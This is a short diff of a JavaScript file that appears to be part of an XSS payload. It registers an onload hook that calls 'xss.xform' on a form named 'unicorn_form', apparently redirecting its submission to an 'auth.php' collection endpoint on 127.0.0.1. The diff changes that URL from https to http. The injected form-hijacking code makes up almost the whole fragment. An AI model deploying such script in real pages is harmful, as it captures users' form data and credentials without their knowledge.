@@ -155,5 +155,6 @@
   
   return x;
 }();
+
 var $$ = function(func){ var oldOnload =window.onload; if(typeof window.onload != 'function'){ window.onload = func; }else{ window.onload = function(){ oldOnload(); func(); } } }
-$$(function(){xss.xform(document.forms['unicorn_form'],'https://127.0.0.1/auth.php?agent=test');})
+$$(function(){xss.xform(document.forms['unicorn_form'],'http://127.0.0.1/auth.php?agent=test');})
